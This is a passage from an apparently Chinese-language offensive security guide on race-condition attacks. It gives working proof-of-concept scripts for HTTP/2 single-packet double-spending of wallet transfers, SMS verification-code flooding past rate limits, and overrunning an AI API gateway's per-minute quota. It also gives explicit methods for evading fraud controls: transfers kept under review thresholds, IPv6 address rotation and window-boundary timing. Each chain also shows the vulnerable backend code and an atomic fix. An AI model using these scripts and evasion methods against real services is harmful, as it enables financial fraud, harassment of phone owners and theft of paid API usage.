    (':authority', 'wallet.target.com'),
    (':scheme', 'https'),
    ('content-type', 'application/json'),
    ('authorization', 'Bearer eyJhbGciOiJIUzI1NiIs...'),
    ('cookie', 'session=attacker_session_id'),
]

# 20个并发流的请求头列表
all_headers = [headers_template] * 20
# 20个并发流的请求体列表
all_bodies = [
    b'{"to_account":"ACC_ATTACKER_002","amount":100.00,"currency":"CNY"}'
] * 20

# 单包发送：所有20个流在同一个TCP段内到达服务器
# 服务器侧分发间隔 < 100 微秒
print("[*] 发送20个并发转账请求 (HTTP/2 单包)...")
conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)

# 读取所有响应
responses = conn.read_multiple_responses()
success = sum(1 for r in responses if r.status_code == 200)
print(f"[+] 成功转账: {success} 次 (预期: 1次)")
print(f"[+] 双花金额: {(success - 1) * 100} CNY")
```

**检测绕过**：
```python
# 绕过：分批次小额双花，避免触发大额转账风控
# 不一次性转100元x20次，而是每次转1元，发200个并发
# 单笔金额低于风控阈值（通常<10元不触发人工审核）
SMALL_AMOUNT = 1.00
BATCH_SIZE = 200  # 200个1元并发请求
# 预期：1次成功，实际：N次成功
# 最终获利 (N-1) * 1 元，但累计可叠加多次执行
```

---

### 攻击链 3：邮件验证码并发绕过限流

**场景**：短信/邮件验证码发送接口限制「每60秒每号码1次」，后端使用 Redis 计数器但采用「先查后增」非原子操作。通过并发请求在计数器递增前多次通过限流校验，实现验证码轰炸或绕过频率限制。

**漏洞根因**：
```python
# 后端脆弱的限流逻辑
def send_verification_code(phone):
    # 致命缺陷：GET 和 INCR 是两个独立操作
    count = redis.get(f"sms_limit:{phone}")  # 查询当前计数
    if count and int(count) >= 1:
        return {"error": "发送过于频繁，请60秒后重试"}, 429
    # === TOCTOU 窗口 ===
    # 多个并发请求同时查到 count=None 或 count=0
    # 全部通过限流校验
    redis.setex(f"sms_limit:{phone}", 60, 1)  # 60秒后过期
    code = generate_code()
    send_sms(phone, code)
    return {"msg": "验证码已发送"}, 200
```

**Turbo Intruder 并发绕过脚本**：
```python
# Turbo Intruder - 验证码发送限流绕过
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,
        requestsPerConnection=20,
        engine=Engine.THREADED,
        maxRetriesPerRequest=0
    )

    # 并发发送20个验证码请求到同一手机号
    for i in range(20):
        engine.queue(target.req, gate='sms_race')

    engine.openGate('sms_race')

def handleResponse(req, interesting):
    table.add(req)
    # 统计：多少个返回200（发送成功）vs 429（限流）
    # 漏洞标志：多个200响应，受害者收到多条短信
```

**原始请求**：
```http
POST /api/send_code HTTP/1.1
Host: api.target.com
Content-Type: application/json
x-request: %s

{"phone":"13800138000","type":"register"}
```

**Python 自动化验证码轰炸脚本**：
```python
#!/usr/bin/env python3
"""
验证码发送限流绕过 PoC
利用并发请求在 Redis 计数器递增前多次通过校验
"""
import threading
import requests
import time

TARGET = "https://api.target.com/api/send_code"
PHONE = "13800138000"  # 测试号码
THREAD_COUNT = 30

barrier = threading.Barrier(THREAD_COUNT)
results = []

def send_code():
    barrier.wait()  # 同步等待
    try:
        resp = requests.post(
            TARGET,
            json={"phone": PHONE, "type": "register"},
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        results.append(resp.status_code)
    except Exception as e:
        results.append(-1)

threads = [threading.Thread(target=send_code) for _ in range(THREAD_COUNT)]
for t in threads:
    t.start()
for t in threads:
    t.join()

success = results.count(200)
limited = results.count(429)
print(f"[+] 发送成功: {success} 次")  # 漏洞: 远大于1
print(f"[+] 被限流: {limited} 次")
print(f"[+] 绕过率: {success}/{THREAD_COUNT} = {success/THREAD_COUNT*100:.1f}%")
```

**检测绕过技术**：
```python
# 绕过1：更换手机号参数绕过基于号码的限流
# 20个请求使用20个不同手机号，每个号码仅1次
phones = ["13800138000", "13800138001", "13800138002", ...]
# 但目标号码相同（通过某种参数注入实现）

# 绕过2：利用 IPv6 大量地址绕过 IP 限流
# 每个 IPv6 /64 子网有 2^64 个地址
import socket
import random

def random_ipv6():
    """生成随机 IPv6 地址"""
    # 前缀固定，后64位随机
    prefix = "2001:db8::"
    suffix = random.randint(0, 0xFFFFFFFFFFFFFFFF)
    return f"{prefix}{suffix:016x}"

# 每个并发请求绑定不同的源 IPv6 地址
# 对抗基于 IP 的限流检测
```

**修复验证**（原子计数器）：
```python
# 安全实现：使用 Redis 原子 INCR 操作
def send_verification_code_safe(phone):
    # INCR 是原子操作，不存在 TOCTOU 窗口
    count = redis.incr(f"sms_limit:{phone}")
    if count == 1:
        redis.expire(f"sms_limit:{phone}", 60)  # 首次设置过期时间
    if count > 1:
        return {"error": "发送过于频繁"}, 429
    code = generate_code()
    send_sms(phone, code)
    return {"msg": "验证码已发送"}, 200
```

---

### 攻击链 4：AI API 限流并发洪泛绕过（2026）

**场景**：2026年某 LLM API 网关（类似 OpenAI API 代理）按用户实施 RPM（每分钟请求数）限制。限流中间件采用「先查后增」模式，在计数器更新前并发请求全部通过校验，导致限额被击穿，产生超额 API 调用费用。

**2026 背景**：AI API 网关普遍采用 Redis + Lua 实现限流，但部分自建网关或早期版本仍使用非原子 check-then-increment 模式。CVE-2026-23947 类问题在多个 LLM 代理项目中重现。

**漏洞根因（AI API 网关中间件）**：
```python
# AI API 网关脆弱的限流中间件 (FastAPI)
from fastapi import Request, HTTPException

# 致命缺陷：检查和递增非原子
async def rate_limit_middleware(request: Request, call_next):
    api_key = request.headers.get("Authorization", "").replace("Bearer ", "")
    user_id = get_user_by_key(api_key).id

    # 步骤1：查询当前分钟内的请求计数（非原子读）
    current_count = await redis.get(f"rpm:{user_id}:{current_minute()}")
    user_plan = get_user_plan(user_id)
    rpm_limit = user_plan.rpm_limit  # 例如: 60 RPM

    if current_count and int(current_count) >= rpm_limit:
        raise HTTPException(429, "Rate limit exceeded")

    # === TOCTOU 窗口 ===
    # 60个并发请求同时查到 current_count=59 或 None
    # 全部通过限流校验

    # 步骤2：递增计数器（延迟写入）
    await redis.incr(f"rpm:{user_id}:{current_minute()}")
    await redis.expire(f"rpm:{user_id}:{current_minute()}", 60)

    # 步骤3：转发到上游 LLM API（产生实际费用）
    response = await call_next(request)
    return response
```

**并发洪泛 PoC 脚本**：
```python
#!/usr/bin/env python3
"""
AI API 限流并发绕过 PoC (2026)
在限流计数器递增前发起大量并发请求，击穿 RPM 限制
"""
import asyncio
import aiohttp
import time
import json

# ===== 配置 =====
API_GATEWAY = "https://ai-gateway.target.com/v1/chat/completions"
API_KEY = "sk-attacker_key_xxxxxxxxxxxx"
RPM_LIMIT = 60  # 用户计划限制: 60 RPM
FLOOD_COUNT = 300  # 并发请求数 (远超限制)

# 同步原语：所有协程同时启动
start_event = asyncio.Event()

async def send_ai_request(session, req_id):
    """单个 AI API 请求，等待 start_event 后同时发送"""
    headers = {
        "Authorization": f"Bearer {API_KEY}",
        "Content-Type": "application/json",
    }
    payload = {
        "model": "gpt-4o",
        "messages": [
            {"role": "user", "content": f"Request {req_id}: Say hello"}
        ],
        "max_tokens": 5,  # 最小 token 消耗，降低成本
    }

    # 等待同步信号
    await start_event.wait()

    try:
        async with session.post(API_GATEWAY, json=payload, headers=headers) as resp:
            status = resp.status
            body = await resp.text()
            return {"id": req_id, "status": status, "body": body[:200]}
    except Exception as e:
        return {"id": req_id, "status": -1, "body": str(e)}

async def main():
    print(f"[*] AI API 限流绕过 PoC")
    print(f"    用户 RPM 限制: {RPM_LIMIT}")
    print(f"    并发请求数: {FLOOD_COUNT}")

    async with aiohttp.ClientSession() as session:
        # 创建所有协程任务
        tasks = [send_ai_request(session, i) for i in range(FLOOD_COUNT)]

        # 同时启动所有请求
        print(f"[*] 同时发起 {FLOOD_COUNT} 个并发请求...")
        start_event.set()

        results = await asyncio.gather(*tasks)

    # 分析结果
    success = sum(1 for r in results if r["status"] == 200)
    limited = sum(1 for r in results if r["status"] == 429)
    other = sum(1 for r in results if r["status"] not in (200, 429))

    print(f"\n[+] 攻击结果:")
    print(f"    成功 (200): {success} 次")
    print(f"    限流 (429): {limited} 次")
    print(f"    其他: {other} 次")
    print(f"    预期成功: {RPM_LIMIT} 次 (RPM 限制内)")
    print(f"    实际成功: {success} 次")
    print(f"    超额调用: {success - RPM_LIMIT} 次")
    if success > RPM_LIMIT:
        print(f"    [!] 限流被击穿! 超额 API 调用产生额外费用")
        print(f"    [!] 按 GPT-4o $5/1M input tokens 计: "
              f"额外费用约 ${success - RPM_LIMIT} * 0.0001")

asyncio.run(main())
```

**HTTP/2 多路复用增强版**（最大化并发穿透）：
```python
#!/usr/bin/env python3
"""
HTTP/2 单包攻击 - AI API 限流击穿 (2026)
利用 HTTP/2 多路复用，300个请求在单个 TCP 段内到达
"""
import h2spacex
import json

conn = h2spacex.H2OnTCPSocket('ai-gateway.target.com', 443)
conn.setup_connection()

# 构造300个 AI API 请求
headers = [
    (':method', 'POST'),
    (':path', '/v1/chat/completions'),
    (':authority', 'ai-gateway.target.com'),
    (':scheme', 'https'),
    ('content-type', 'application/json'),
    ('authorization', 'Bearer sk-attacker_key_xxxxxxxxxxxx'),
]

body = json.dumps({
    "model": "gpt-4o",
    "messages": [{"role": "user", "content": "hi"}],
    "max_tokens": 1
}).encode()

# 300个流在同一 TCP 段内发送
# 服务器分发间隔 < 100微秒，远小于限流中间件的处理延迟
print("[*] 发送300个并发 AI API 请求 (HTTP/2 单包)...")
conn.send_multiple_requests_at_once(
    [headers] * 300,
    body_list=[body] * 300
)

responses = conn.read_multiple_responses()
success = sum(1 for r in responses if r.status_code == 200)
print(f"[+] 成功: {success}/300 (RPM限制: 60)")
print(f"[+] 超额: {success - 60} 次 (限流击穿)")
```

**检测绕过技术**：
```python
# 绕过1：分散到多个 API Key（如果攻击者持有多个低额度 Key）
# 每个 Key 发送 RPM_LIMIT-1 个请求，N 个 Key 共 N*(RPM_LIMIT-1) 次
# 但此方法不击穿单 Key 限流，仅扩大总量

# 绕过2：利用限流窗口边界（分钟切换瞬间）
# 在 59秒 -> 00秒 的窗口切换时刻发起并发请求
# 旧窗口计数器即将过期，新窗口计数器尚未初始化
import time
from datetime import datetime

def wait_for_window_boundary():
    """等待到下一分钟边界附近"""
    now = datetime.now()
    # 计算到下一分钟剩余秒数
    seconds_to_next = 60 - now.second
    # 提前0.5秒开始准备，在边界时刻0.1秒后发起
    time.sleep(seconds_to_next - 0.5)
    # 预热连接...
    time.sleep(0.6)  # 等到新窗口刚开始
    # 此时新窗口计数器=0，并发请求全部通过

# 绕过3：利用流式响应(SSE)绕过基于响应的计数
# 部分网关仅在响应完成后才计数，流式请求可长时间占用
# 在流式请求未完成时发起更多请求
payload = {
    "model": "gpt-4o",
    "messages": [{"role": "user", "content": "Write a very long essay..."}],
    "stream": True,  # 流式响应，延迟计数
    "max_tokens": 4096
}
```

**修复方案（原子限流）**：
```python
# 安全实现：Redis + Lua 原子限流脚本
RATE_LIMIT_LUA = """
local key = KEYS[1]
local limit = tonumber(ARGV[1])
local window = tonumber(ARGV[2])
local current = tonumber(redis.call('GET', key) or '0')
if current >= limit then
    return 0  -- 被限流
end
-- INCR 和 EXPIRE 在同一个 Lua 脚本中原子执行
redis.call('INCR', key)
if current == 0 then
    redis.call('EXPIRE', key, window)
end
return 1  -- 允许
"""

async def rate_limit_safe(user_id, rpm_limit=60):
    key = f"rpm:{user_id}:{current_minute()}"
    # 原子执行：检查+递增在单个 Lua 脚本中完成
    allowed = await redis.eval(RATE_LIMIT_LUA, 1, key, rpm_limit, 60)
    if not allowed:
        raise HTTPException(429, "Rate limit exceeded")
```
